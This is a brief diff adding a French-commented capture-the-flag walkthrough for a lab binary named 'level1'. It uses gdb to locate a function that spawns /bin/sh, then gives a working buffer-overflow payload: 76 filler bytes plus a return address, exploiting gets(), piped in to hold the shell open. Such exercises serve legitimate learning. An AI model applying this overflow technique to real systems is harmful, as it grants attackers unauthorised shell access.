@@ -1,0 +1,8 @@
+# En verifant les fonctions utiliser à l'aide de gdb, on s'apercoit qu'il y a une fonction run
+gdb level1
+info functions
+# En la dessassemblant on s'apercoit qu'elle fait un appel systeme à /bin/sh
+# On recupere l'adresse memoire de la fonction
+# On a plus cas faire une overflow grace au gets qu'il y a et lancer la fonction
+python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/level1 //on ecrit 76 a puit l'adresse memoire en little endian, qu'on stock dans un fichier
+cat /tmp/level1 - | ./level1 // on cat avec - pour rester dans le cat et profiter du sh ouvert
